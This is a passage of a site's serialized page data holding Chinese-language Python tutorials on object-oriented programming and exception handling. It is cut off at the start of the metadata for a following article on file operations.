实例属性\n\n实例属性是从属于实例对象的属性，也称为实例变量。实例属性一般在init方法中进行初始化，可以通过self.实例属性名访问实例属性，在创建实例对象之后，可以通过对象名.实例属性名。也可以新添加属性。\n\n# 实例方法\n\n实例方法是从属于实例对象的方法，实例方法定义时，第一个参数必须为self，后面的为形参列表。在调用实例方法时，不需要也不能给self传递参数，self由解释器自动传递参数。方法的定义格式如下所示：\n\ndef say_score(self,abc):\n  print(self.name,'分数是：',self.score)\n  print(abc)\n# 调用方式\n  s1 = student(\"zhangsan\",20)\n  s1.say_score(123) # zhangsan 分数是： 20 123\n\n\n1\n2\n3\n4\n5\n6\n\n\n方法和函数有什么区别？\n\n * 方法和函数都是用来完成特定功能的代码块\n * 方法通过对象来调用，从属于一个实例对象，而函数不一样\n * 方法定义是需要传递self参数，函数不需要。\n\n一些常见的操作：\n\nclass student:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n\n    def say_hello(self):\n        print(self.name,'hello')\n\n# 获取对象的所有属性和方法\ns = student(\"zhangsan\",12)\nprint(dir(s)) # ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name', 'say_hello']\n\nprint(s.__dict__) # {'name': 'zhangsan', 'age': 12}\n\npass # 空语句\n\nprint(isinstance(s, student)) # true  判断对象是不是为某种类型\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 类对象、类属性、类方法、静态方法\n\n# 类对象\n\npython中一切都是对象，类也是，称为类对象，使用class关键字定义。\n\nclass student:\n    pass\n\ns = student()\nprint(type(student)) # <class 'type'>\n\nprint(type(student())) # <class '__main__.student'>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 类属性\n\n类属性是从属于类对象的属性，也称为类变量，因为从属于类对象，因此可以被所有的实例对象共享。\n\n类属性的定义方式：\n\nclass student:\n    name = \"zhansgan\"\n\nprint(student.name) # zhansgan\n\n\n1\n2\n3\n4\n\n\n可以通过类名.类变量的方式访问。\n\n# 类方法\n\n类方法是从属于类对象的方法，使用@classmethod定义。第一个cls参数必须要传递，代表的是类对象的本身。调用类方法的方式是：类名.类方法名(参数列表)。参数列表中，不需要传递cls值。类方法中访问实例属性和实例方法导致错误，子类继承父类方法时，传入cls时子类对象，而并非是类对象。\n\nclass student:\n    company = \"hello\"\n\n    @classmethod\n    def printconpany(cls):\n        print(cls.company)\n\nstudent.printconpany() # hello\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 静态方法\n\npython中允许定义和类对象无关的方法，称为静态方法。静态方法和普通函数没有区别，只不过静态方法放到了类的名字空间里面，需要通过类来调用。静态方法的调用格式为：类名.静态方法名(参数列表)。静态方法中访问实例属性和实例方法会报错。\n\nclass student:\n    company = \"xxx\"\n\n    @staticmethod\n    def add(a,b):\n        print(\"{0}+{1}={2}\".format(a,b,a+b))\n        return a+b\n\nstudent.add(1,2) # 1+2=3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# __del__方法和垃圾回收\n\n__del__方法称为析构方法，用于实现对象销毁时所需要的操作。比如释放对象资源等等。python可以实现自动的垃圾回收机制，当对象没有被引用时，由垃圾回收器调用__del——_方法。我们可以使用del删除对象，调用__del__方法。\n\nclass person:\n    def __del__(self):\n        print(\"销毁对象：{0}\".format(self))\n\np1 = person()\np2 = person()\ndel p2\nprint(\"----\")\n\n\"\"\"\n销毁对象：<__main__.person object at 0x7fd23000b5e0>\n----\n销毁对象：<__main__.person object at 0x7fd23000be80>\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# __call__方法和可调用对象\n\n实现了__call__方法的对象称为可调用对象，即该对象可以被像函数一样调用。\n\nclass calcutil:\n    def __call__(self,a,b):\n        print(\"{0}+{1}={2}\".format(a,b,a+b))\n\ns = calcutil()\ns(1,2) # 1+2=3\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 方法重载\n\n在python中方法没有重载，其他语言中，可以定义多个同名的方法，只要保证方法的签名唯一即可。方法的签名包含方法名，参数数量和参数类型。\n\npython中，方法的参数没有声明参数类型，参数的数量也可以由可变参数控制。因此python中不存在方法重载。如果在类中定义了多个同名方法，只有最后一个方法是有效的。\n\nclass person:\n    def say(self):\n        print(\"hello1\")\n    def say(self):\n        print(\"hello2\")\n\np1 = person()\np1.say() # hello2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 方法的动态性\n\npython是一种动态语言，我们可以给类添加新的方法，或者动态的修改类现有的一些方法。\n\nclass person:\n    def work(self):\n        print(\"shangban\")\n\ndef play(self):\n        print(\"play\")\n\ndef work2(self):\n    print(\"work2\")\n\nperson.play_game = play\nperson.work = work2\n\np = person()\n\nprint(dir(p))\n\np.play_game() # play\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 私有属性和私有方法\n\npython对于类的成员没有严格访问的控制限制，这和其他的面向独享的语言有所区别。通常情况下我们约定两个下划线开头的属性是私有属性，其他的为公共的。类内部可以访问私有属性，类外部不能直接访问私有的属性。类外部可以通过_类名__私有属性名访问私有属性或者方法。\n\nclass employee:\n    __company = \"aaa\"\n\n    def __init__(self,name,age):\n        self.name = name\n        self.__age = age\n    def say_company(self):\n        print(\"我的公司是：\",employee.__company) # 我的公司是： aaa\n        print(self.name,\"的年龄是\",self.__age) # zhangsan 的年龄是 12\n        self.__work()\n\n    def __work(self):\n        print(\"work\") # work\n\ne1 = employee(\"zhangsan\",12)\nprint(e1.name)  # zhangsan\nprint(e1._employee__age) # 12\ne1.say_company()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# @property装饰器\n\n@property可以将一个方法的调用变为对属性的调用。\n\nclass employee:\n\n    @property\n    def salary(self):\n        return 2000\n\nemp = employee()\nprint(emp.salary) # 2000\nprint(type(emp.salary)) # <class 'int'>\n\n# emp.salary() # typeerror: 'int' object is not callable\n\nemp.#salary = 200 # attributeerror: can't set attribute 'salary'\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n@property用于帮助我们处理属性的读写操作，对于属性我们可以直接赋值的方式读写，但是对于一些数据，有一些范围的限制，必须通过setget方法来进行写入和读取。\n\nclass employee:\n\n    def __init__(self):\n        self.__salary = 0\n\n    @property\n    def salary(self):\n        return self.__salary\n\n    @salary.setter\n    def salary(self,salary):\n        if(0<salary<1000):\n            self.__salary = salary\n        else:\n            print(\"数据异常\")\n\nemp = employee()\nprint(emp.salary)\nemp.salary = 200\nprint(emp.salary) # 200\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 面向对象的三大特征\n\npython是面向对象的语言，支持面向对象的三大特征，分别是封装继承和多态。\n\n * 封装是隐藏对象的属性和实现的具体细节，只对外提供必要的方法，相当于将细节封装起来，只对外暴露相关的调用方法。\n * 继承可以让子类具有父类的特性，可以提高代码的重用性\n * 多态指的是同一个方法调用因为不同的对象会产生不同的行为。\n\n\n# 继承\n\n继承是面向对象的一个重要特性，也是实现代码复用的重要的手段。python中可以实现多重继承，一个子类可以继承多个父类，如果在类定义中没有指定父类，则默认是继承object类，objec类是所有的类的父类。定义子类时必须在构造函数中调用父类的构造函数，调用方式如下：父类名.__init___(self,参数列表)\n\n示例代码：\n\nclass person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass student(person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        person.__init__(self,name,age)\n\ns1 = student(\"zhangsan\",12,1,100)\ns1.say_hello() # hello, zhangsan\nprint(dir(s1))\nprint(s1.name) # zhangsan\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 类成员的继承和重写\n\n 1. 成员继承，子类可以继承父类除了构造方法以外的所有成员。\n 2. 方法重写，子类可以重新定义父类中的方法，覆盖掉原本的父类方法，称为重写。\n\nclass person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass student(person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        person.__init__(self,name,age)\n\n    def say_hello(self):\n        print(\"i am a student\")\n\ns1 = student(\"zhangsan\",12,1,100)\ns1.say_hello() # i am a student\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# 查看类的层次结构\n\n可以通过类方法mro() 或者类属性__mro__输出类的层次结构\n\nclass person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass student(person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        person.__init__(self,name,age)\n\n    def say_hello(self):\n        print(\"i am a student\")\n\nprint(student.mro()) # [<class '__main__.student'>, <class '__main__.person'>, <class 'object'>]\n\nprint(student.__mro__) # (<class '__main__.student'>, <class '__main__.person'>, <class 'object'>)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# object类\n\nobject类是所有类的父类，object中的方法在每个类中都存在。\n\n可以通过dir()来查看对象的属性，我们可以通过dir函数，产看置顶对象中的所有属性。\n\n在object中有一个__str__()方法，该方法用于返回一个对象的信息。类似于java中的tostring方法。\n\nclass person:\n    def __str__(self):\n        print(\"person\")\n        return \"i am a person\"\n\np = person()\nprint(p) # i am a person\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 多重继承\n\n和java不一样，python是支持多重继承的，因此一个子类可以有多个直接的父类。但是这样的继承方式往往太复杂，应该尽量的避免使用。\n\n# mro()\n\npython中支持多重继承，如果父类中有相同名字的方法，在子类中没有指定父类名时，默认按照从做向右的顺序搜索。mro(method resolution order)：方法的解析顺序。\n\n# super() 获得父类定义\n\n在子类中，如果想要获得某个父类的方法时，我们可以通过super来调用，super代表的是父类的定义，而不是父类的对象。\n\nclass person:\n    def __str__(self):\n        print(\"person\")\n        return \"i am a person\"\n    def say(self):\n        print(\"say\")\n\nclass student(person):\n    def say(self):\n        print(\"student\")\n        super().say()\n\ns1 = student()\ns1.say()  # student say\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 多态\n\n多态指的是同一个方法因为不通的对象调用所产生的不同的行为。多态是方法的多态，对于属性并没有多态，多态有两个重要的条件，一个是继承，一个是方法的重写。\n\nclass animal:\n    def shout(self):\n        print(\"animal shout\")\n\nclass dog(animal):\n    def shout(self):\n        print(\"wang wang\")\n\nclass cat(animal):\n    def shout(self):\n        print(\"miaomiao\")\n\ndef animalshot(a):\n    if isinstance(a,animal):\n        a.shout()\n\nanimalshot(cat()) # miaomiao\nanimalshot(dog()) # wang wang \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 特殊方法和运算符重载\n\npython中的运算符实际上都是通过调用对象的特殊方法实现的。\n\na = 10\nb = 20\nc = a+b\nd = a.__add__(b)\nprint(c) # 30\nprint(d) # 30\n\n\n1\n2\n3\n4\n5\n6\n\n\npython一些特殊的方法：\n\n方法                 说明      例子\n__init__           构造方法    对象创建：p = person()\n__del__            析构方法    对象回收\n__repr__,__str__   打印，转换   print(a)\n__call__           函数调用    a()\n__getattr__        点号运算    a.xxx\n__setattr__        属性赋值    a.xxx = value\n__getitem__        索引运算    a[key]\n__setitem__        索引赋值    a[key]=value\n__len__            长度      len(a)\n\n运算符所对应的特殊的方法如下：\n\n运算符        特殊方法                                       说明\n运算符+       __add__                                    加法\n运算符-       __sub__                                    减法\n<,<=,==    __lt__,__le__，__eq__                       比较运算符\n>,>=,!=    __gt__,__ge__,__ne__                       \n|,^,&      __or__,__xor__,__and__                     或、异或、与\n<<,>>      __lshift__,__rshift__                      左移、右移\n*,/,%,//   __mul__,__truediv__,__mod__,__floordiv__   乘、浮点除、模运算 （取余）、整数除\n**         __pow__                                    指数运算\n\n我们可以重写以上的方法实现方法的重载：\n\nclass person:\n    def __init__(self,name):\n        self.name = name\n\n    def __add__(self, other):\n        if isinstance(other,person):\n            return \"{0} -- {1} \".format(self.name,other.name)\n        else:\n            return \"error\"\n\ns1 = person(\"zhangsan\")\ns2 = person(\"lisi\")\nprint(s1 + s2) # zhangsan -- lisi \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 特殊的属性\n\npython中对象包含了很多以下划线开始和结束的属性，这些特殊属性常见的如下：\n\n特殊方法                     含义\nobj.__dict__             对象的属性字典\nobj.__class__            对象所属的类\nclass.__bases__          类的基类元组（多继承）\nclass.__base__           类的基类\nclass.__mro__            类层次结构\nclass.__subclasses__()   子类列表\n\n# 对象的深浅拷贝\n\n在上面我们其实已经提到对象的深浅拷贝的问题，浅拷贝时对象包含的子对象不会被拷贝，深拷贝则拷贝子对象。python中使用copy.copy()实现浅拷贝，使用copy.deepcopy()实现深拷贝。",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Python异常处理的那些事",frontmatter:{title:"Python异常处理的那些事",date:"2022-03-26T20:00:00.000Z",permalink:"/sec/dev/python/exception",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/05.Python%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.安全/202.安全开发/2020.Python/05.Python异常处理的那些事.md",key:"v-2968b3d4",path:"/sec/dev/python/exception/",headers:[{level:2,title:"Python异常处理",slug:"python异常处理",normalizedTitle:"python异常处理",charIndex:280},{level:3,title:"try...except结构",slug:"try-except结构",normalizedTitle:"try...except结构",charIndex:295},{level:3,title:"return语句和异常处理",slug:"return语句和异常处理",normalizedTitle:"return语句和异常处理",charIndex:1682},{level:2,title:"常见异常汇总",slug:"常见异常汇总",normalizedTitle:"常见异常汇总",charIndex:1762},{level:2,title:"with上下文管理",slug:"with上下文管理",normalizedTitle:"with上下文管理",charIndex:3676},{level:2,title:"trackback模块",slug:"trackback模块",normalizedTitle:"trackback模块",charIndex:3925},{level:2,title:"自定义异常类",slug:"自定义异常类",normalizedTitle:"自定义异常类",charIndex:4377}],excerpt:'<h1 id="python异常机制的那些事"><a class="header-anchor" href="#python异常机制的那些事">#</a> Python异常机制的那些事</h1>\n<blockquote>\n<p>异常是程序在运行过程中，由于用户输入或者其他原因导致的程序中出现的非正常的运行现象。异常处理是指程序在出现问题时依然可以正确的执行代码，不会因为异常而终止程序运行。</p>\n</blockquote>\n',headersStr:"Python异常处理 try...except结构 return语句和异常处理 常见异常汇总 with上下文管理 trackback模块 自定义异常类",content:'# Python异常机制的那些事\n\n> 异常是程序在运行过程中，由于用户输入或者其他原因导致的程序中出现的非正常的运行现象。异常处理是指程序在出现问题时依然可以正确的执行代码，不会因为异常而终止程序运行。\n\nPython中引进了很多用来描述和处理异常的类，称为异常类，异常类定义中包含了该异常的信息和处理的方法。\n\n针对异常的处理态度包含两个方式：\n\n * 抛出异常：在执行一个方法时，如果发生异常，则这个方法生成代表该异常的一个对象，停止执行当前的执行路径，并把异常对象提交给解释器。\n * 捕获异常：解释器获得到异常之后，寻找相关的代码处理异常。\n\n\n# Python异常处理\n\n\n# try...except结构\n\ntry...except是最常见的异常处理机制，和Java中的try...catch类似。结构如下：\n\ntry:\n    a = 1/0\nexcept BaseException as e:\n    print(e) # division by zero\n\n\n1\n2\n3\n4\n\n\ntry块包含着可能引发异常的代码，except块用于捕获和处理发生的异常。执行的时候，如果try中没有引发异常，则不会执行except中的代码，如果引发了异常，则会跳过异常后的语句，执行except中的异常处理代码，处理完成之后，继续运行try...except后续代码。\n\n同时，如果一个try中可能出现多个类型的异常，就可以添加多个Exception的except。如下所示：\n\ntry:\n    a = input("请输入被除数：")\n    b = input("请输入除数：")\n    c = float(a)/float(b)\n    print(c)\nexcept ZeroDivisionError:\n    print("除数不能为0")\nexcept TypeError:\n    print("除数和被除数应该为数")\nexcept NameError:\n    print("变量不存在")\nexcept BaseException as e:\n    print(e)\n    print(type(e))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ntry...except...else结构中增加了一个else快，如果try中没有抛出异常，则执行else块，如果执行了except块，就不执行了else块。\n\ntry:\n    a = input("请输入被除数：")\n    b = input("请输入除数：")\n    c = float(a)/float(b)\n    print(c)\nexcept ZeroDivisionError:\n    print("除数不能为0")\nexcept TypeError:\n    print("除数和被除数应该为数")\nexcept NameError:\n    print("变量不存在")\nexcept BaseException as e:\n    print(e)\n    print(type(e))\nelse:\n    print("aaa")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nTry...except...finally结构中，无论是否发生异常都会执行finally中的语句，通常用finally中的语句用来释放资源。\n\ntry:\n    a = input("hello")\n    b = input("world")\n    c = float(a)/float(b)\n    print(c)\nexcept BaseException as e:\n    print(e)\nelse:\n    print(c)\nfinally:\n    print("hahhahaha")\nprint("end")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# return语句和异常处理\n\nreturn语句有两种作用，结束方法运行和返回值。我们一般不会把return语句放到异常处理的结构中，通常放到方法最后。\n\n\n# 常见异常汇总\n\n异常名称                        说明\nArithmeticError             所有数值计算错误的基类\nAssertionError              断言语句失败\nAttributeError              对象没有这个属性\nBaseException               所有异常的基类\nDeprecationWarning          关于被弃用的特征的警告\nEnvironmentError            操作系统错误的基类\nEOFError                    没有内建输入,到达 EOF 标记\nException                   常规错误的基类\nFloatingPointError          浮点计算错误\nFutureWarning               关于构造将来语义会有改变的警告\nGeneratorExit               生成器(generator)发生异常来通知退出\nImportError                 导入模块/对象失败\nIndentationError            缩进错误\nIndexError                  序列中没有此索引(index)\nIOError                     输入/输出操作失败\nKeyboardInterrupt           用户中断执行(通常是输入^C)\nKeyError                    映射中没有这个键\nLookupError                 无效数据查询的基类\nMemoryError                 内存溢出错误(对于 Python 解释器不是致命的)\nNameError                   未声明/初始化对象 (没有属性)\nNotImplementedError         尚未实现的方法\nOSError                     操作系统错误\nOverflowError               数值运算超出最大限制\nOverflowWarning             旧的关于自动提升为长整型(long)的警告\nPendingDeprecationWarning   关于特性将会被废弃的警告\nReferenceError              弱引用(Weak reference)试图访问已经垃圾回收了的对象\nRuntimeError                一般的运行时错误\nRuntimeWarning              可疑的运行时行为(runtime behavior)的警告\nStandardError               所有的内建标准异常的基类\nStopIteration               迭代器没有更多的值\nSyntaxError                 Python 语法错误\nSyntaxWarning               可疑的语法的警告\nSystemError                 一般的解释器系统错误\nSystemExit                  解释器请求退出\nTabError                    Tab 和空格混用\nTypeError                   对类型无效的操作\nUnboundLocalError           访问未初始化的本地变量\nUnicodeDecodeError          Unicode 解码时的错误\nUnicodeEncodeError          Unicode 编码时错误\nUnicodeError                Unicode 相关的错误\nUnicodeTranslateError       Unicode 转换时错误\nUserWarning                 用户代码生成的警告\nValueError                  传入无效的参数\nWarning                     警告的基类\nWindowsError                系统调用失败\nZeroDivisionError           除(或取模)零 (所有数据类型)\n\n\n# with上下文管理\n\nfinally块由于在是否发生异常都会执行，通常用来释放资源代码，我们也可以通过with进行上下文的管理，更方便实现资源的释放。\n\nwith上下文管理可以自动的管理资源，在with代码块执行完成之后，自动还原进入代码之前的上下文，不管是因为什么原因跳出了with，总能保证资源的及时释放。\n\nwith的使用方法如下所示：\n\nwith open("d:/aaa.txt") as f:\n  for line in f:\n    print(line)\n\n\n1\n2\n3\n\n\n\n# trackback模块\n\n使用traceback模块可以打印异常的信息。\n\nimport traceback\ntry:\n    print(1/0)\nexcept:\n    traceback.print_exc()\n"""\nTraceback (most recent call last):\n  File "/Users/plankton/Workspace/Py/StudyPy/demo.py", line 942, in <module>\n    print(1/0)\nZeroDivisionError: division by zero\n"""\n\ntry:\n    print("hello")\n    a = 1/0\nexcept:\n    with open("./error.log","a") as f:\n        traceback.print_exc(file=f)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 自定义异常类\n\n在程序开发中，我们有时候需要自定义异常的类，通常继承Exception即可，命名为Error、Exception等。下面是一个异常类的例子：\n\nclass MyException(Exception):\n    def __init__(self,errorInfo):\n        Exception.__init__(self)\n        self.errorInfo = errorInfo\n    def __str__(self):\n        return str(self.errorInfo)+"hahaha"\n\nif __name__ == \'__main__\':\n    age = int(input("aaa"))\n    if age <1 or age>100:\n        raise MyException("报错了")\n    else:\n        print("age",age)\n        \n        """\n        aaa123\nTraceback (most recent call last):\n  File "/Users/plankton/Workspace/Py/StudyPy/demo.py", line 970, in <module>\n    raise MyException("报错了")\n__main__.MyException: 报错了hahaha\n        """\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n在程序中抛出异常可以使用raise',normalizedContent:'# python异常机制的那些事\n\n> 异常是程序在运行过程中，由于用户输入或者其他原因导致的程序中出现的非正常的运行现象。异常处理是指程序在出现问题时依然可以正确的执行代码，不会因为异常而终止程序运行。\n\npython中引进了很多用来描述和处理异常的类，称为异常类，异常类定义中包含了该异常的信息和处理的方法。\n\n针对异常的处理态度包含两个方式：\n\n * 抛出异常：在执行一个方法时，如果发生异常，则这个方法生成代表该异常的一个对象，停止执行当前的执行路径，并把异常对象提交给解释器。\n * 捕获异常：解释器获得到异常之后，寻找相关的代码处理异常。\n\n\n# python异常处理\n\n\n# try...except结构\n\ntry...except是最常见的异常处理机制，和java中的try...catch类似。结构如下：\n\ntry:\n    a = 1/0\nexcept baseexception as e:\n    print(e) # division by zero\n\n\n1\n2\n3\n4\n\n\ntry块包含着可能引发异常的代码，except块用于捕获和处理发生的异常。执行的时候，如果try中没有引发异常，则不会执行except中的代码，如果引发了异常，则会跳过异常后的语句，执行except中的异常处理代码，处理完成之后，继续运行try...except后续代码。\n\n同时，如果一个try中可能出现多个类型的异常，就可以添加多个exception的except。如下所示：\n\ntry:\n    a = input("请输入被除数：")\n    b = input("请输入除数：")\n    c = float(a)/float(b)\n    print(c)\nexcept zerodivisionerror:\n    print("除数不能为0")\nexcept typeerror:\n    print("除数和被除数应该为数")\nexcept nameerror:\n    print("变量不存在")\nexcept baseexception as e:\n    print(e)\n    print(type(e))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ntry...except...else结构中增加了一个else快，如果try中没有抛出异常，则执行else块，如果执行了except块，就不执行了else块。\n\ntry:\n    a = input("请输入被除数：")\n    b = input("请输入除数：")\n    c = float(a)/float(b)\n    print(c)\nexcept zerodivisionerror:\n    print("除数不能为0")\nexcept typeerror:\n    print("除数和被除数应该为数")\nexcept nameerror:\n    print("变量不存在")\nexcept baseexception as e:\n    print(e)\n    print(type(e))\nelse:\n    print("aaa")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntry...except...finally结构中，无论是否发生异常都会执行finally中的语句，通常用finally中的语句用来释放资源。\n\ntry:\n    a = input("hello")\n    b = input("world")\n    c = float(a)/float(b)\n    print(c)\nexcept baseexception as e:\n    print(e)\nelse:\n    print(c)\nfinally:\n    print("hahhahaha")\nprint("end")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# return语句和异常处理\n\nreturn语句有两种作用，结束方法运行和返回值。我们一般不会把return语句放到异常处理的结构中，通常放到方法最后。\n\n\n# 常见异常汇总\n\n异常名称                        说明\narithmeticerror             所有数值计算错误的基类\nassertionerror              断言语句失败\nattributeerror              对象没有这个属性\nbaseexception               所有异常的基类\ndeprecationwarning          关于被弃用的特征的警告\nenvironmenterror            操作系统错误的基类\neoferror                    没有内建输入,到达 eof 标记\nexception                   常规错误的基类\nfloatingpointerror          浮点计算错误\nfuturewarning               关于构造将来语义会有改变的警告\ngeneratorexit               生成器(generator)发生异常来通知退出\nimporterror                 导入模块/对象失败\nindentationerror            缩进错误\nindexerror                  序列中没有此索引(index)\nioerror                     输入/输出操作失败\nkeyboardinterrupt           用户中断执行(通常是输入^c)\nkeyerror                    映射中没有这个键\nlookuperror                 无效数据查询的基类\nmemoryerror                 内存溢出错误(对于 python 解释器不是致命的)\nnameerror                   未声明/初始化对象 (没有属性)\nnotimplementederror         尚未实现的方法\noserror                     操作系统错误\noverflowerror               数值运算超出最大限制\noverflowwarning             旧的关于自动提升为长整型(long)的警告\npendingdeprecationwarning   关于特性将会被废弃的警告\nreferenceerror              弱引用(weak reference)试图访问已经垃圾回收了的对象\nruntimeerror                一般的运行时错误\nruntimewarning              可疑的运行时行为(runtime behavior)的警告\nstandarderror               所有的内建标准异常的基类\nstopiteration               迭代器没有更多的值\nsyntaxerror                 python 语法错误\nsyntaxwarning               可疑的语法的警告\nsystemerror                 一般的解释器系统错误\nsystemexit                  解释器请求退出\ntaberror                    tab 和空格混用\ntypeerror                   对类型无效的操作\nunboundlocalerror           访问未初始化的本地变量\nunicodedecodeerror          unicode 解码时的错误\nunicodeencodeerror          unicode 编码时错误\nunicodeerror                unicode 相关的错误\nunicodetranslateerror       unicode 转换时错误\nuserwarning                 用户代码生成的警告\nvalueerror                  传入无效的参数\nwarning                     警告的基类\nwindowserror                系统调用失败\nzerodivisionerror           除(或取模)零 (所有数据类型)\n\n\n# with上下文管理\n\nfinally块由于在是否发生异常都会执行，通常用来释放资源代码，我们也可以通过with进行上下文的管理，更方便实现资源的释放。\n\nwith上下文管理可以自动的管理资源，在with代码块执行完成之后，自动还原进入代码之前的上下文，不管是因为什么原因跳出了with，总能保证资源的及时释放。\n\nwith的使用方法如下所示：\n\nwith open("d:/aaa.txt") as f:\n  for line in f:\n    print(line)\n\n\n1\n2\n3\n\n\n\n# trackback模块\n\n使用traceback模块可以打印异常的信息。\n\nimport traceback\ntry:\n    print(1/0)\nexcept:\n    traceback.print_exc()\n"""\ntraceback (most recent call last):\n  file "/users/plankton/workspace/py/studypy/demo.py", line 942, in <module>\n    print(1/0)\nzerodivisionerror: division by zero\n"""\n\ntry:\n    print("hello")\n    a = 1/0\nexcept:\n    with open("./error.log","a") as f:\n        traceback.print_exc(file=f)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 自定义异常类\n\n在程序开发中，我们有时候需要自定义异常的类，通常继承exception即可，命名为error、exception等。下面是一个异常类的例子：\n\nclass myexception(exception):\n    def __init__(self,errorinfo):\n        exception.__init__(self)\n        self.errorinfo = errorinfo\n    def __str__(self):\n        return str(self.errorinfo)+"hahaha"\n\nif __name__ == \'__main__\':\n    age = int(input("aaa"))\n    if age <1 or age>100:\n        raise myexception("报错了")\n    else:\n        print("age",age)\n        \n        """\n        aaa123\ntraceback (most recent call last):\n  file "/users/plankton/workspace/py/studypy/demo.py", line 970, in <module>\n    raise myexception("报错了")\n__main__.myexception: 报错了hahaha\n        """\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n在程序中抛出异常可以使用raise',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Python文件操作的那些事",frontmatter:{title:"Python文件操作的那些事",date:"2022-03-26T23:00:00.000Z",permalink:"/sec/dev/python/file",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/06.Python%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.安全/202.安全开发/2020.Python/06.Python文件操作的那些事.md",key:"v-eadc1a9a",path:"/sec/dev/python/file/",headers:[{level:2,title:"文本文件和二进制文件",slug:"文本文件和二进制文件",normalizedTitle:"文本文件和二进制文件",charIndex:126},{level:2,title:"文件操作模块简介",slug:"文件操作模块简介",normalizedTitle:"文件操作模块简介",charIndex:297},{level:2,title:"创建文件对象",slug:"创建文件对象",normalizedTitle:"创建文件对象",charIndex:843},{level:2,title:"文本文件处理",slug:"文本文件处理",normalizedTitle:"文本文件处理",charIndex:1197},{level:3,title:"文本文件的写入",slug:"文本文件的写入",normalizedTitle:"文本文件的写入",charIndex:1208},{level:3,title:"文本文件的读取",slug:"文本文件的读取",normalizedTitle:"文本文件的读取",charIndex:2057},{level:2,title:"二进制文件的处理",slug:"二进制文件的处理",normalizedTitle:"二进制文件的处理",charIndex:2909},{level:2,title:"文件对象的属性和方法",slug:"文件对象